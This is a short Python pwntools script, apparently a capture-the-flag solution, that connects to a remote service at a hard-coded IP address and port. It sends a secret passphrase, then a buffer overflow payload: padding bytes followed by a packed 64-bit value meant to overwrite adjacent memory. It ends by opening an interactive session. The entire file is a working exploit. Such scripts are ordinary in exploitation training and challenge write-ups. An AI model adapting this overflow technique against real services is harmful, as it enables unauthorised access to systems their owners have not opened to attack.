from pwn import *

p = remote("62.173.140.174", "17200")

p.recvuntil(b'Enter your thoughts: ', timeout=1)
p.sendline(b'CODEBY_Secret_Base')
p.recvline()
p.recvline()

p.sendline((0x4054 - 0x4020) * b'A' + p64(15580379))
p.interactive()
